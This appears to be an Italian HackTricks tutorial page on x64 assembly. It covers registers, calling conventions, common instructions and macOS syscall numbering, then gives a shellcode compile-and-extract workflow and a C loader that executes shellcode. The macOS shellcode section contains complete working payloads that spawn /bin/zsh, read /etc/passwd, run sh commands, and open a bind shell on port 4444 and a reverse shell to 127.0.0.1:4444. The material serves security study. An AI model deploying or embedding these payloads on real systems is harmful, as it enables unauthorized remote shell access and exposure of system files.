# Introduzione a x64

{{#include ../../../banners/hacktricks-training.md}}

## **Introduzione a x64**

x64, noto anche come x86-64, è un'architettura di processori a 64 bit utilizzata prevalentemente nei sistemi desktop e server. Originatasi dall'architettura x86 prodotta da Intel e successivamente adottata da AMD con il nome AMD64, oggi è l'architettura prevalente nei personal computer e nei server.

### **Registri**

x64 amplia l'architettura x86, includendo **16 registri general-purpose** denominati `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi` e da `r8` a `r15`. Ognuno di questi può memorizzare un valore di **64 bit** (8 byte). Questi registri dispongono anche di sottoregistri da 32, 16 e 8 bit per garantire la compatibilità e per attività specifiche.

1. **`rax`** - Utilizzato tradizionalmente per i **valori restituiti** dalle funzioni.
2. **`rbx`** - Spesso utilizzato come **registro base** per le operazioni sulla memoria.
3. **`rcx`** - Comunemente utilizzato per i **contatori dei loop**.
4. **`rdx`** - Utilizzato in vari ruoli, incluse le operazioni aritmetiche estese.
5. **`rbp`** - **Base pointer** per lo stack frame.
6. **`rsp`** - **Stack pointer**, tiene traccia della cima dello stack.
7. **`rsi`** e **`rdi`** - Utilizzati come indici di **origine** e **destinazione** nelle operazioni su stringhe e memoria.
8. **Da `r8`** a **`r15`** - Registri general-purpose aggiuntivi introdotti in x64.

### **Calling Convention**

La calling convention di x64 varia a seconda del sistema operativo. Ad esempio:

- **Windows**: i primi **quattro parametri** vengono passati nei registri **`rcx`**, **`rdx`**, **`r8`** e **`r9`**. I parametri successivi vengono inseriti nello stack. Il valore restituito si trova in **`rax`**.
- **System V (utilizzata comunemente nei sistemi simili a UNIX)**: i primi **sei parametri interi o puntatori** vengono passati nei registri **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** e **`r9`**. Anche il valore restituito si trova in **`rax`**.

Se la funzione ha più di sei input, **i restanti verranno passati nello stack**. **RSP**, lo stack pointer, deve essere **allineato a 16 byte**, il che significa che l'indirizzo a cui punta deve essere divisibile per 16 prima dell'esecuzione di qualsiasi call. Ciò significa che normalmente dovremmo assicurarci che RSP sia correttamente allineato nel nostro shellcode prima di effettuare una function call. Tuttavia, nella pratica, le system call spesso funzionano anche quando questo requisito non viene rispettato.

### Calling Convention in Swift

Swift ha una propria **calling convention**, che può essere [**consultata qui**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)**:**

### **Istruzioni comuni**

Le istruzioni x64 offrono un insieme ricco di funzionalità, mantenendo la compatibilità con le istruzioni x86 precedenti e introducendone di nuove.

- **`mov`**: **Sposta** un valore da un **registro** o da una **posizione di memoria** a un'altra.
- Esempio: `mov rax, rbx` — Sposta il valore da `rbx` a `rax`.
- **`push`** e **`pop`**: Inseriscono o estraggono valori nello/dallo **stack**.
- Esempio: `push rax` — Inserisce il valore contenuto in `rax` nello stack.
- Esempio: `pop rax` — Estrae il valore in cima allo stack e lo inserisce in `rax`.
- **`add`** e **`sub`**: Operazioni di **addizione** e **sottrazione**.
- Esempio: `add rax, rcx` — Somma i valori in `rax` e `rcx`, memorizzando il risultato in `rax`.
- **`mul`** e **`div`**: Operazioni di **moltiplicazione** e **divisione**. Nota: hanno comportamenti specifici riguardo all'utilizzo degli operandi.
- **`call`** e **`ret`**: Utilizzate per **chiamare** le funzioni e **restituire il controllo** da esse.
- **`int`**: Utilizzata per attivare un'**interrupt** software. Ad esempio, `int 0x80` veniva utilizzata per le system call nei sistemi Linux x86 a 32 bit.
- **`cmp`**: **Confronta** due valori e imposta i flag della CPU in base al risultato.
- Esempio: `cmp rax, rdx` — Confronta `rax` con `rdx`.
- **`je`, `jne`, `jl`, `jge`, ...**: Istruzioni di **salto condizionale** che modificano il flusso di controllo in base ai risultati di una precedente istruzione `cmp` o test.
- Esempio: dopo un'istruzione `cmp rax, rdx`, `je label` — Salta a `label` se `rax` è uguale a `rdx`.
- **`syscall`**: Utilizzata per le **system call** in alcuni sistemi x64, come i moderni sistemi Unix.
- **`sysenter`**: Un'istruzione ottimizzata per le **system call** su alcune piattaforme.

### **Prologo della funzione**

1. **Inserisci il vecchio base pointer**: `push rbp` (salva il base pointer del chiamante)
2. **Sposta lo stack pointer corrente nel base pointer**: `mov rbp, rsp` (imposta il nuovo base pointer per la funzione corrente)
3. **Alloca spazio nello stack per le variabili locali**: `sub rsp, <size>` (dove `<size>` è il numero di byte necessari)

### **Epilogo della funzione**

1. **Sposta il base pointer corrente nello stack pointer**: `mov rsp, rbp` (dealloca le variabili locali)
2. **Estrai il vecchio base pointer dallo stack**: `pop rbp` (ripristina il base pointer del chiamante)
3. **Restituisci il controllo**: `ret` (restituisce il controllo al chiamante)

## macOS

### syscalls

Esistono diverse classi di syscalls, che puoi [**trovare qui**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Quindi, puoi trovare il numero di ogni syscall [**a questo URL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Quindi, per chiamare la syscall `open` (**5**) dalla **Unix/BSD class**, devi aggiungerla: `0x2000000`

Il numero della syscall da chiamare per `open` sarebbe `0x2000005`

### Shellcodes

Per compilare:
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
Per estrarre i byte:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>Codice C per testare la shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Tratto da [**qui**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) e spiegato.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### Lettura con cat

L'obiettivo è eseguire `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, quindi il secondo argomento (x1) è un array di parametri (che in memoria corrisponde a uno stack di indirizzi).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Invoca comando con sh
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

Bind shell da [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) sulla **porta 4444**<sup>[[2]](#references)</sup>.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

Reverse shell da [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell verso **127.0.0.1:4444**<sup>[[3]](#references)</sup>.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
## Riferimenti

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [Packet Storm - macOS TCP 4444 Bind Shell (Null-Free) Shellcode](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)
- [3] [Packet Storm - macOS 127.0.0.1:4444 Reverse Shell Shellcode](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)

{{#include ../../../banners/hacktricks-training.md}}
